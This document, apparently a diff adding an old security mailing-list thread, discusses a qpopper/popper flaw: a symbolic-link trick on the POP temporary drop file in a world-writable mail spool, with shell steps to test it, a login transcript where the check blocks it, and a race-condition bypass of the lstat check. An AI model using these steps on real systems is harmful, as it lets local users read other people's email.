@@ -1,0 +1,62 @@
+
+Some versions of popper and qpopper from qualcomm allow you to read
+other peoples email.  There are quite a few situations in which you
+need your mail spool directory chmodded 1777.  If you have local users
+on a machine with the mail spool directory, they can create symbolic
+links from the temporary pop drop box to a file that they can read.
+
+See if youre vulnerable:
+
+        1) touch /tmp/lumpy; chmod 777 /tmp/lumpy
+        2) ln -s /tmp/lumpy /var/mail/.luser.pop
+        3) wait for them to check their email.
+        4) while they are reading it from the pop
+           server, look at the file in the tmp dir.
+
+Apparently it is fixed in the newest version.
+
+----------------------------------------------------------------------
+
+
+Here's what I did when I tried this on my personal system at home which
+runs QPOPPER 2.2:
+
+/tmp$ telnet localhost 110
+Trying 127.0.0.1...
+Connected to localhost.
+Escape character is '^]'.
++OK QPOP (version 2.2) at (zang!) starting.  <2104.871076037@(plink!)>
+user (poof!)
++OK Password required for (zap!).
+pass (boink!)
+- -ERR Your temporary drop file /usr/spool/mail/.(blink!).pop is not type 'regular file'
+
+Even version 2.2 of qpopper is smart enough to know the difference between
+a regular file and a symbolic link.
+
+
+----------------------------------------------------------------------
+
+
+Looks like there is a race condition in there.  It opens the file, does
+some fstat()s on it to check a few things, then does:
+
+#if defined(S_ISREG)
+    /* Make sure the file is not a symbolic link reference */
+    lstat(p->temp_drop, &mybuf);
+    if (!S_ISREG(mybuf.st_mode)) {
+        close(dfd);
+        return pop_msg(p, POP_FAILURE,
+        "Your temporary drop file %s is not type 'regular file'", p->temp_drop);
+    }
+#endif
+
+All you need is a (rm .user.pop; touch .user.pop) after the open but
+before the lstat to get around that check.
+
+This code is from v2.4b2.  I'm not sure how this helps you do anything
+though, since you are running setuid() to the user at that point; if a
+user can read other user's mailboxes normally, I wouldn't be blaming
+qpopper.
+
+
